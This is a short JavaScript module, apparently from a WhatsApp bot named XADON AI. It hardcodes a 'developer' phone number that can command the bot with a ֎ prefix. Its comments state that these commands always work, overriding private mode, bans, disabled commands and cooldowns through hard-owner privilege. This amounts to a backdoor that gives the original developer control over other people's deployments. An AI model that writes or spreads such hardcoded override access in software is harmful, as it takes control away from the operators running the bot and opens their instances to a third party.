/**
 * XADON AI · developer identification.
 * Developer: 2349123429926 · mark: ֎
 *
 * - Anytime the developer's message contains ֎, the bot reacts ֎ under it.
 * - The developer can drive the bot with the ֎ prefix (e.g. ֎ping) and it
 *   ALWAYS works — even in private mode / maintenance / autosleep / cooldown.
 * - Implemented as hard-owner privilege (see lib/privs.js), so every existing
 *   exemption (private, banned, disabled-commands, cooldown, antis) follows.
 */
const DEV_NUMBER = '2349123429926';
const DEV_MARK = '֎';

const digits = (v = '') => String(v).split('@')[0].split(':')[0].replace(/\D/g, '');

function isDev(value = '') {
  return digits(value) === DEV_NUMBER;
}

function containsMark(text = '') {
  return String(text || '').includes(DEV_MARK);
}

/** Effective command prefix for this sender: dev may use ֎ instead of the normal prefix. */
function effectivePrefix(body = '', normalPrefix = '.', number = '') {
  if (isDev(number) && String(body || '').startsWith(DEV_MARK)) return DEV_MARK;
  return normalPrefix;
}

module.exports = { DEV_NUMBER, DEV_MARK, digits, isDev, containsMark, effectivePrefix };
